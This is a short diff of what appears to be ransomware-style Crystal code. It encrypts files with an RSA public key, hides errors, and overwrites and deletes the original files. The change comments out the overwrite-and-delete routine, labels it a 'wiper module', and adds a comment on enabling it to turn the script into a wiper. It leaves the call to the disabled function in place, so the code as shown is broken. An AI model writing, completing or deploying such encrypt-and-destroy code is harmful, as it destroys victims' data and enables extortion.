@@ -7,14 +7,14 @@ def backup_files(file_paths : Array(String))
   # Backup logic here.
 end
 
-# Securely delete a file by overwriting and then deleting
-def overwrite_and_delete(file_path : String)
-  file_size = File.size(file_path)
-  File.open(file_path, "w") do |file|
-    file_size.times { file.print("\0") } # Overwrite with zeros
-  end
-  File.delete(file_path)
-end
+# Wiper module. Default: OFF
+#def overwrite_and_delete(file_path : String)
+#  file_size = File.size(file_path)
+#  File.open(file_path, "w") do |file|
+#    file_size.times { file.print("\0") } # Overwrite with zeros
+#  end
+#  File.delete(file_path)
+#end
 
 # Encrypts file content using RSA and handles errors silently
 def safely_process(file_path : String, public_key_path : String)
@@ -31,6 +31,7 @@ def safely_process(file_path : String, public_key_path : String)
     end
 
     # Securely delete original file after encryption
+    # Enable this to convert the script into a wiper:
     overwrite_and_delete(file_path)
   rescue
     # Error handling: Log or silently ignore errors as per requirement
